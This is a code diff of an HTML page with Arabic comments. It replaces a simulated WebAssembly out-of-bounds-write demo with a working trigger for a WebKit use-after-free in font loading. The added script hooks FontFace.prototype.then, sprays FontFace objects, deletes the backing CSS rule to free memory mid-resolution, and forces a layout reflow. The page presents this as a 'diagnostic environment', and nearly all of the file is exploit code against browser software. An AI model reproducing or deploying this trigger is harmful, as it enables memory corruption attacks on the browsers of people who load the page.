@@ -1,40 +1,68 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <style>
-        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; padding: 20px; }
-        #console { border: 1px solid #333; padding: 10px; height: 500px; overflow-y: scroll; background: #0a0a0a; font-size: 12px; }
-        .log { margin-bottom: 3px; border-bottom: 1px solid #111; }
-    </style>
+<style id="s">
+/* إنشاء القاعدة الأساسية المراد حذفها لاحقاً لتوليد اختلال في شجرة الأنماط */
+@font-face { font-family: targetFont; src: url(nonexistent-font.woff); unicode-range: U+0042; }
+</style>
 </head>
 <body>
-    <h3>JANUS_JIT_MEMORY_LEAKER v1.0</h3>
-    <div id="console"></div>
+    <div id="status_panel" style="font-family: monospace; color: #00ff00; background: #000; padding: 10px;">
+        [INFO] WebKit UAF Diagnostic Environment Initializing...
+    </div>
 
 <script>
-    // 1. إنشاء ذاكرة خطية (Linear Memory) - هذا هو ملعبنا الحقيقي
-    // تخصيص صفحة واحدة (64KB)
-    const memory = new WebAssembly.Memory({ initial: 1 });
-    const memoryBuffer = new Uint8Array(memory.buffer);
-
-    // 2. محاكاة "ثغرة" (OOB Write)
-    // لنفرض أن المصفوفة المنطقية تنتهي عند العنوان 10
-    const ARRAY_SIZE = 10;
-    
-    function writeToMemory(index, value) {
-        // "الثغرة" هنا: لا يوجد فحص للحدود (Bounds Checking)
-        memoryBuffer[index] = value;
+// وظيفة برمجية لطباعة الحالات على الشاشة لتوثيق مراحل الاختبار
+function updateStatus(message) {
+    const panel = document.getElementById('status_panel');
+    if (panel) {
+        panel.innerHTML += "<br>[*] " + message;
     }
+}
 
-    // 3. التنفيذ
-    console.log("الوصول الطبيعي:");
-    writeToMemory(5, 0xAA); // كتابة داخل النطاق
-    
-    console.log("الوصول غير القانوني (الثغرة):");
-    writeToMemory(1000, 0xBB); // كتابة خارج النطاق في الذاكرة الخام!
-    
-    console.log("قيمة العنوان 1000 أصبحت: " + memoryBuffer[1000].toString(16));
+window.onload = () => {
+    updateStatus("DOM Loaded. Preparing FontFace objects...");
+
+    // إنشاء كائن الخط المستهدف (A) وتمريره إلى نظام الخطوط بالمتصفح
+    let A = new FontFace('targetFont', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+    document.fonts.add(A);
+    void A.loaded;
+
+    let fired = false;
+
+    // تزييف خاصية 'then' لاعتراض التنفيذ الداخلي للمحرك (JSC Engine Hook)
+    Object.defineProperty(FontFace.prototype, 'then', {
+        configurable: true,
+        get() {
+            // التحقق من أن عملية الاعتراض تحدث على الكائن المستهدف فقط
+            if (!fired && this === A) {
+                fired = true;
+                updateStatus("Hook triggered! Intercepting internal Promise resolution...");
+
+                // محاولة إشغال مخصص الذاكرة (Allocator) بكائنات جديدة أثناء التحرير
+                new FontFace('helper1', 'local(Arial)', { unicodeRange: 'U+0041' });
+                new FontFace('helper2', 'local(Arial Bold)', { unicodeRange: 'U+0041' });
+
+                updateStatus("Executing sheet.deleteRule(0) to free underlying C++ structure...");
+                // حذف القاعدة: هنا يتم تحرير الذاكرة في المتصفحات المصابة
+                document.getElementById('s').sheet.deleteRule(0);
+
+                updateStatus("Forcing synchronous layout reflow via offsetTop...");
+                // إجبار المتصفح على معالجة الذاكرة فوراً
+                document.body.offsetTop; 
+            }
+            return undefined;
+        }
+    });
+
+    updateStatus("Invoking document.fonts.load to trigger the vulnerability path...");
+    // استدعاء الدالة التي ستجبر المحرك على البحث عن .then
+    document.fonts.load('1em targetFont', 'AB');
+
+    setTimeout(() => {
+        updateStatus("Diagnostic sequence finished. Check if browser survived or crashed.");
+    }, 500);
+};
 </script>
-
 </body>
 </html>
